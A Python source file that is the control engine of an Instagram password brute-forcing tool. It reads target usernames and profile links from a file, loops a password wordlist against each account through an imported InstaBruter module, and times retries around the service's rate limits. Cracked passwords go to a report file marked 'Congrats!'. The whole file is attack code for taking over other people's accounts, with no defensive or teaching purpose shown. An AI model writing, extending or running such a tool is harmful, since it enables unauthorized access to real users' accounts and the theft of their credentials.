from bruter import InstaBruter
from database import DatabaseWrapper
from time import time, sleep

class Engine:
    def __init__(self):
        self.attacks = 0
        self.on_duty = True
        self.total_users = 0
        self.passed_users = 0
        self.total_passwords = 0
        self.total_trials = 0
        self.pre_attack()
        self.attack()
        self.post_attack()

    def pre_attack(self):
        DatabaseWrapper().create_tables()
        self.write_usernames()
        self.total_users = DatabaseWrapper().COUNT()
        self.total_passwords = self.count_passwords()
        self.total_trials = self.total_users * self.total_passwords

    def attack(self):
        while self.on_duty: 
            for ID in range(1, self.total_users + 1):
                check = self.check_readiness(ID)
                if check == True: 
                    InstaBruter(ID)
                    self.attacks += 1
                elif check == 'Crack':
                    self.on_duty = False
                    break
                else : continue
        print(f'{self.attacks} Attack Has Been Launched')
        
    def post_attack(self):
      for ID in range(1, DatabaseWrapper().COUNT() + 1):
        self.closure(ID)

    def write_usernames(self):
        with open('usernames.txt', 'r') as f:
            creds = [cred.split(',') for cred in f.readlines()]
            for username, main in creds:
                if 'instagram.com' in username: username = self.link_ftch(username)
                try : DatabaseWrapper().ADD(username.strip(), main.strip())
                except : continue

    def update_main(self, username, main):
        DatabaseWrapper().db_execute(
        f""" 
        UPDATE USERS
        SET Main = ?
        WHERE Username= ?
        """, args=[main, username])

    def link_ftch(self, link):
        return link.split('https://instagram.com/')[1].split('?utm_medium=copy_link')[0]


    def new_session(self):
        for ID in range(1, DatabaseWrapper().COUNT() + 1):
            DatabaseWrapper().UPDATE(ID, 'Trials', 0)

    def count_passwords(self):
        with open('passwords.txt', "r") as f:
            return len([each.strip() for each in f.readlines()])

    def closure(self, ID):
        success = DatabaseWrapper().GET(ID, 'Success')
        username = DatabaseWrapper().GET(ID, 'Username')
        elapsed = int(DatabaseWrapper().GET(ID, 'Time')) / 60
        trials = DatabaseWrapper().GET(ID, 'Trials')
        ctime = DatabaseWrapper().GET(ID, 'Ctime')
        if success in (1, '1'):
            reported = DatabaseWrapper().GET(ID, 'Reported')
            if reported in (1, '1'): return
            else : DatabaseWrapper().UPDATE(ID, 'Reported', 1)
            password = DatabaseWrapper().GET(ID, 'Password')
            print('Password Found :', username, password)
            with open('Report.txt', 'a') as f:
                f.write(f'A password has been found for {username} : {password} \n')
                f.write(f'After {trials} trial, at {ctime}\n')
                f.write(f'Whithin : {int(elapsed)}m{int((elapsed - int(elapsed)) * 60)}s\n')
                f.write('Congrats!\n\n')

        elif success in (0, '0'):
            print('Password Not found :', username)
            with open('Report.txt', 'a') as f:
                f.write(f'No password has been found for {username} \n')
                f.write(f'Attack finished after {trials} trial, at {ctime}\n')
                f.write(f'Whithin : {int(elapsed)}m{int((elapsed - int(elapsed)) * 60)}s\n\n')

        else :
            print('Succes Type not Identified')

    def check_readiness(self, ID):
        if DatabaseWrapper().GET(ID, 'Success') in (1, '1') : return False
        if DatabaseWrapper().GET(ID, 'Trials') >= self.total_passwords: 
            self.passed_users += 1
            if self.passed_users == self.total_users : return 'Crack'
            return False
        

        Rtime = DatabaseWrapper().GET(ID, 'Rtime')
        if Rtime != 0 :
            Rtime2 = 800 - (time() - Rtime)
            if Rtime2 < 15 and Rtime2 > 0:
                print(f'Sleeping for {Rtime2}s')
                sleep(Rtime2)
                return True
            elif Rtime2 < 0:
                return True
            return False
        return True

if __name__ == '__main__':
    Engine()
    # except KeyboardInterrupt: exit(print('Cancelling...'))
    # DatabaseWrapper().UPDATE(1, 'WordListPos', 9)